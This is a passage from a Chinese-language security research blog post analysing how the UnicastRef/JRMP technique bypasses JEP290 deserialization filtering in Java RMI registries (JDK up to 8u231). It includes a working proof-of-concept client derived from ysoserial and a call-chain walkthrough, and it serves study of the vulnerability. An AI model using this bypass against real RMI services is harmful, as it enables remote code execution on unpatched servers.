class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException </span>&#123;</span><br><span class="line">        Registry reg = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">2222</span>); <span class="comment">// rmi start at 2222</span></span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt());</span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">3333</span>); <span class="comment">// JRMPListener&#x27;s port is 3333</span></span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">        Registry proxy = (Registry) Proxy.newProxyInstance(TestClient.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        reg.bind(<span class="string">&quot;Hello&quot;</span>,proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16082771273444.jpg" alt="-w1790"></p>
<h4 id="UnicastRef-Bypass-JEP290-分析-jdk-lt-8u231"><a href="#UnicastRef-Bypass-JEP290-分析-jdk-lt-8u231" class="headerlink" title="UnicastRef Bypass JEP290 分析 (jdk&lt;=8u231)"></a>UnicastRef Bypass JEP290 分析 (jdk&lt;=8u231)</h4><p>这里的绕过原理图参考了的Hu3sky师傅文章里面的，相对来说比较好理解(注意我这里演示的JRMP端在3333端口)：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16082781476907.jpg"></p>
<p>通过UnicastRef对象建立一个JRMP连接，JRMPListener端将序列化传给注册中心反序列化的过程中没有<code>setObjectInputFilter</code>，传给注册中心的恶意对象会被反序列化进而攻击成功。</p>
<p>TestClient里面的语句是从<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/JRMPClient.java">ysoserial/payloads/JRMPClient.java</a>里面取的，主要作用就是传递一个<code>UnicastRef</code>来给注册中心传递恶意对象。并且这个payload里面的对象都是在白名单里的，不会被拦截。</p>
<p>客户端调用<code>LocateRegistry.getRegistry</code>获取注册中心后，获得的是一个封装了UnicastRef对象的<code>RegistryImpl_Stub</code>对象，其中<code>UnicastRef</code>对象用于与注册中心创建通信。</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16082801291702.jpg" alt="-w743"></p>
<p>这个payload的原理就是伪造了一个<code>UnicastRef</code>用于跟注册中心通信，我们从<code>bind()</code>方法开始分析一下这一整个流程。</p>
<p>当我们调用<code>bind()</code>方法时，注册中心处理数据的时候会对数据进行反序列化。使用的是readObject方法最终是调用了<code>RemoteObjectInvocationHandler</code>父类<code>RemoteObject</code>的<code>readObject</code>(<code>RemoteObjectInvocationHandler</code>没有实现<code>readObject</code>方法)。</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16082968818320.jpg" alt="-w900"></p>
<p>跟入<code>readObject()</code>，最后有一个<code>ref.readExternal(in);</code>，这个<code>readObject()</code>的调用链：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16083515149391.jpg" alt="-w900"></p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16082980586029.jpg" alt="-w999"></p>
<p>继续跟入：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16082982106757.jpg" alt="-w900"><br><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16082983554156.jpg" alt="-w899"></p>
<p>可以看到这里把payload里所传入的<code>LiveRef</code>解析到<code>var5</code>变量处，里面包含了<code>ip</code>与<code>端口</code>信息(JRMPListener的端口)。这些信息将用于后面注册中心与JRMP端建立通信。</p>
<p>接着再回到<code>dispatch</code>那里，在调用了<code>readObject</code>方法之后调用了<code>var2.releaseInputStream();</code>，持续跟入：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16082993330475.jpg" alt="-w900"></p>
<p>继续跟入<code>this.in.registerRefs();</code>：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16082994081296.jpg" alt="-w1232"></p>
<p>可以看到这里的传利的<code>var2</code>就是之前的<code>ip</code>和<code>端口</code>信息。继续跟入：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16082996458629.jpg" alt="-w1372"></p>
<p><code>EndpointEntry</code>创建了一个<code>DGCImpl_Stub</code>，最后<code>DGCCient.EndpointEntry</code>返回的<code>var2</code>是一个<code>DGCClient</code>对象：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16082998520961.jpg" alt="-w900"></p>
<p>继续跟入<code>var2.registerRef</code>：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16083001135641.jpg" alt="-w900"></p>
<p>最后一行调用了<code>this.makeDirtyCall</code>并传入了<code>DGCClient</code>对象：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16083002490251.jpg" alt="-w900"></p>
<p>调用了<code>this.dgc.dirty</code>方法：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16083003454639.jpg" alt="-w900"></p>
<p>在这里注册中心就跟JRMP开始建立连接了：通过<code>newCall</code>建立连接，<code>writeObject</code>写入要请求的数据，<code>invoke</code>来处理传输数据。这里是将数据发送到JRMP端，继续跟入看下在哪里接收的JRMP端的数据。跟入<code>super.ref.invoke(var5);</code>。</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16083096113499.jpg" alt="-w900"></p>
<p>跟入<code>var1.executeCall()</code>：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16083099142712.jpg" alt="-w900"></p>
<p>JRMP端发过来的数据会在这里被反序列化，这一个过程是没有调用<code>setObjectInputFilter</code>的，<code>serialFilter</code>也就为空，所以只需要让JRMP端返回一个恶意对象就可以攻击成功了。而这个JRMP端可以直接用<code>ysoserial</code>启动。</p>
<p>判断<code>serialFilter</code>的<code>filterCheck</code>方法调用链如下：</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16083119753812.jpg" alt="-w900"></p>
<h4 id="Bypass-JEP290-jdk-8u231"><a href="#Bypass-JEP290-jdk-8u231" class="headerlink" title="Bypass JEP290 (jdk=8u231)"></a>Bypass JEP290 (jdk=8u231)</h4><p>在JDK8u231的<code>dirty</code>函数中多了<code>setObjectInputFilter</code>过程，所以用<code>UnicastRef</code>就没法再进行绕过了。</p>
<p><img src="https://sanzhi-1259392731.cos.ap-chengdu.myqcloud.com/2020/12/19/16083822925714.jpg" alt="-w900"></p>
<p>国外安全研究人员<code>@An Trinhs</code>发现了一个gadgets利用链，能够直接反序列化<code>UnicastRemoteObject</code>造成反序列化漏洞。</p>
<p>可以参考Hu3sky师傅的分析文章：<a target="_blank" rel="noopener" href="https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1">RMI Bypass Jep290(Jdk8u231) 反序列化漏洞分析</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>RMI是我学习JAVA安全的第二个着重学习的内容了，花了接近两周才把知识给整理完，学起来还是很吃力的。不过在这不停的踩坑、调试过程中，学到的知识也是不少的。(即使有些调试还是很偷懒)很享受这种一段时间可以只学一个知识的日子，安逸哇~</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/xinghun_4/article/details/45787549">java RMI原理详解</a></li>
<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/de85fad05dcb">分布式架构基础:Java RMI详解</a></li>
<li><a target="_blank" rel="noopener" href="https://0day.design/2020/01/24/Apache-Commons-Collections-3.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Java入坑：Apache-Commons-Collections-3.1 反序列化漏洞分析</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1194/">JAVA RMI 反序列化知识详解</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7079">基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI</a></li>
<li>Java-RMI-学习总结 - p1g3</li>
<li>Java RMI 反序列化漏洞 - Hu3sky</li>
</ul>

    </div>
    
</div>
    <div class="footer" id="footer">
    <p>Copyright © 2020 Threezh1
        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
            <input type="checkbox" name="switch" id="update_style">
            <span class="el-switch-style"></span>
        </label> -->
<!--         <script type="text/javascript">
        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
        </script> -->
    </p>
</div>
<input type="hidden" id="web_style" value="black">
<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">

<script src="/libs/jquery.min.js"></script>


<script src="/libs/highlight/highlight.pack.js"></script>

<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>

<script src="/js/js.js"></script>

<style type="text/css">
.v * {
    color: #698fca;
}

.v .vlist .vcard .vhead .vsys {
    color: #3a3e4a;
}

.v .vlist .vcard .vh .vmeta .vat {
    color: #638fd5;
}

.v .vlist .vcard .vhead .vnick {
    color: #6ba1ff;
}

.v a {
    color: #8696b1;
}

.v .vlist .vcard .vhead .vnick:hover {
    color: #669bfc;
}
</style>
</body>

</html>